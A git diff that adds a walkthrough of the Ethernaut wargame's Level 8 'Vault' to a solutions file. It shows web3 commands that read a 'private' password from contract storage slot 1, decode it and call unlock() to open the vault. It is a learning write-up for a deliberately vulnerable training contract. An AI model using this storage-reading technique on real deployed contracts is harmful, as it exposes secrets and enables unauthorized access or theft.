@@ -361,3 +361,56 @@ This confirms the ETH was successfully transferred and the level is complete.
 
 ## Level completed
 ![Level Complete Output](assets/Force.png)
+
+# Ethernaut Level 8: Vault
+
+## Strategy
+
+- **Vulnerability**: Although the password is marked as `private`, Solidity stores all contract storage on-chain and it can be read using `web3.eth.getStorageAt`. The `password` is located at storage slot 1.
+- **Exploit**: We read the private storage directly from the contract, extract the password, and use it to call the `unlock()` function to set `locked = false`.
+
+---
+
+## Commands Used
+
+### 1. Get the password from storage slot 1
+```
+await web3.eth.getStorageAt(instance, 1)
+```
+The password is stored at slot 1. This reveals the raw `bytes32` value.
+
+---
+
+### 2. Decode the password to readable ASCII
+```
+web3.utils.hexToAscii("0x...")  // Use the result from the previous step
+```
+**Output**: `"A very strong secret password : )"`
+
+---
+
+### 3. Convert the password back to bytes32 format
+```
+let password = web3.utils.asciiToHex("A very strong secret password : )");
+```
+The contract's `unlock()` function expects a `bytes32` argument, so the string needs to be converted back.
+
+---
+
+### 4. Unlock the vault
+```
+await contract.unlock(password);
+```
+
+---
+
+### 5. Check if the vault is unlocked
+```
+await contract.locked();
+```
+**Output**: `false`
+
+---
+
+## Level completed
+![Level Complete Output](assets/Vault.png)
